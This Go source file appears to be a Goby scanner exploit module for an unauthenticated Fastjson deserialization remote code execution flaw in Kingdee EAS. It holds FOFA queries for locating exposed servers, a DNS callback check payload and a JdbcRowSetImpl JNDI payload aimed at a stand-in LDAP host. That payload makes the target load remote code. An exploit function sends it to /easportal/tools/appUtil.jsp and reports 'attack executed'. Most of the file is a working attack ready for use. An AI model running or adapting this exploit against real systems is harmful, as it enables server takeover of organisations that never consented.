package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Kingdee EAS Fastjson Deserialization Remote Code Execution Vulnerability",
    "Description": "<p>Kingdee EAS is the world's first enterprise management software that integrates togaf standard SOA architecture. With the product design concept of \"creating borderless information flow\", it is an integrated technology platform that supports cloud computing, SOA and dynamic process management. </p><p>Kingdee EAS is under version 8.5, and there is an unauthorized fastjson deserialization vulnerability. Attackers can execute malicious fastjson to attack payload, execute malicious code, and obtain server operation permissions.</p>",
    "Impact": "Kingdee EAS Fastjson Deserialization Remote Code Execution Vulnerability",
    "Recommendation": "<p>It is recommended to contact the manufacturer to upgrade to a newer version.https://www.kingdee.com/</p>",
    "Product": "Kingdee-EAS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "金蝶 EAS 系统 Fastjson 反序列化 RCE 漏洞",
            "Description": "<p>金蝶EAS是全球首款集成togaf标准SOA架构的企业管理软件。以“创造无边界信息流”为产品设计理念，是一个支持云计算、SOA、动态流程管理的集成技术平台。<br></p><p>金蝶 EAS 在 8.5 版本以下，存在未授权的 Fastjson 反序列化漏洞，攻击者可以执行恶意 Fastjson 攻击 payload，执行恶意代码，获取服务器操作权限。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">金蝶 EAS 在 8.5 版本以下，存在未授权的 Fastjson 反序列化漏洞，攻击者可以执行恶意 Fastjson 攻击 payload，执行恶意代码，获取服务器操作权限。</span><br></p>",
            "Recommendation": "<p>建议联系厂商升级至较新版本。<a href=\"https://www.kingdee.com/\" target=\"_blank\">https://www.kingdee.com/</a></p>",
            "Product": "金蝶-EAS",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Kingdee EAS Fastjson Deserialization Remote Code Execution Vulnerability",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Kingdee EAS is the world's first enterprise management software that integrates togaf standard SOA architecture. With the product design concept of \"creating borderless information flow\", it is an integrated technology platform that supports cloud computing, SOA and dynamic process management.&nbsp;<br></span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Kingdee EAS is under version 8.5, and there is an unauthorized fastjson deserialization vulnerability. Attackers can execute malicious fastjson to attack payload, execute malicious code, and obtain server operation permissions.</span><br></p>",
            "Impact": "Kingdee EAS Fastjson Deserialization Remote Code Execution Vulnerability",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">It is recommended to contact the manufacturer to upgrade to a newer version.<a href=\"https://www.kingdee.com/\" target=\"_blank\">https://www.kingdee.com/</a></span><br></p>",
            "Product": "Kingdee-EAS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\")",
    "GobyQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.kingdee.com/",
    "DisclosureDate": "2022-06-05",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "json",
            "type": "input",
            "value": "{\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://xxxx.x.x\",\"autoCommit\":true}}",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10499"
}`

	exploitEASFastjson02138aa47294 := func(json string, host *httpclient.FixUrl) bool {
		if json != "" {
			requestConfig := httpclient.NewGetRequestConfig("/easportal/tools/appUtil.jsp?list=" + url.QueryEscape(json))
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randStr)
			payload := "{\"x\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"" + checkUrl + "\"}}"
			if exploitEASFastjson02138aa47294(payload, u) {
				return godclient.PullExists(randStr, time.Second*20)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			json := ss.Params["json"].(string)
			if exploitEASFastjson02138aa47294(json, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "攻击已执行"
			}
			return expResult
		},
	))
}
